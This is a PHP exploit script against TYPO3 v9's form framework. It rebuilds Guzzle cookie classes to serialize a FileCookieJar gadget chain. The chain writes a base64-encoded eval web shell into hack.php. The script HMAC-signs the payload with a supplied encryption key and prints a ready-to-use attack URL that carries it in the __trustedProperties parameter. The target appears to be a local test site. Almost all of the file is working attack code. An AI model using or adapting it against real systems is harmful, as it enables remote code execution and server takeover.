<?php
namespace GuzzleHttp\Cookie {
    class SetCookie
    {
        private static $defaults = [
            'Name'     => null,
            'Value'    => null,
            'Domain'   => null,
            'Path'     => '/',
            'Max-Age'  => null,
            'Expires'  => null,
            'Secure'   => false,
            'Discard'  => false,
            'HttpOnly' => false
        ];
        private $data;

        public function __construct(array $data = [])
        {
            $this->data = array_replace(self::$defaults, $data);
        }
    }

    class CookieJar
    {
        private $strictMode;
        private $cookies = [];

        public function setCookie(SetCookie $cookie)
        {
            $this->cookies[] = $cookie;
        }
    }

    class FileCookieJar extends CookieJar
    {
        private $filename;
        private $storeSessionCookies;

        public function __construct($cookieFile, $storeSessionCookies = false)
        {
            $this->filename = $cookieFile;
            $this->storeSessionCookies = $storeSessionCookies;
        }
    }
}

namespace {
    $encryptionKey = readline('Encryption Key: ');

    $code = preg_replace(
        '#(^<\?php|\?>$)#', '',
        file_get_contents(__DIR__ . '/l10n-diffsource-payload-root.php')
    );
    $targetFileName = 'hack.php';
    $setCookie = new \GuzzleHttp\Cookie\SetCookie([
        'Name' => 'CookieName',
        'Domain' => 'CookieDomain',
        'Expires' => 1,
        'Discard' => false,
        'Value' => '<hr><pre><?php eval(base64_decode(\'' . base64_encode($code) . '\')); ?></pre><hr>'
    ]);

    $fileCookieJar = new \GuzzleHttp\Cookie\FileCookieJar($targetFileName, true);
    $fileCookieJar->setCookie($setCookie);
    $payload = serialize($fileCookieJar);

    echo 'Real payload (signed)' . PHP_EOL;
    $signedPayload = $payload . hash_hmac('sha1', $payload, $encryptionKey);
    print_r($signedPayload  . PHP_EOL);

    echo '---' . PHP_EOL;

    echo 'Real payload (signed, encoded)' . PHP_EOL;
    print_r(rawurlencode($signedPayload) . PHP_EOL);

    echo '---' . PHP_EOL;

    echo 'Possible URI' . PHP_EOL;
    print_r('http://typo3v9-hack.ddev.site/index.php?id=38&no_cache=1&tx_form_formframework[__trustedProperties]=' . rawurlencode($signedPayload) . PHP_EOL);

    echo '---' . PHP_EOL;
}
